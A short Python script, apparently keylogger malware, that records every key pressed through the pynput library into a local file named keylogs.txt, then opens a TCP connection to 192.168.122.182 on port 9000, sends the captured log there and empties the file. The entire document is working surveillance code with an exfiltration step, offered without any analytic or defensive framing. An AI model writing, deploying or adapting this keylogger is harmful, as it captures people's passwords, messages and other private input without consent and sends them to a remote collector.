from pynput import keyboard
import socket

def on_press(key):
    with open('keylogs.txt', 'a') as f:
        try:
            f.write(str(key.char))
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")

def send_logs():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('192.168.122.182', 9000))
        with open('keylogs.txt', 'rb') as f:
            data = f.read()
            s.sendall(data)
    open('keylogs.txt', 'w').close()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    send_logs()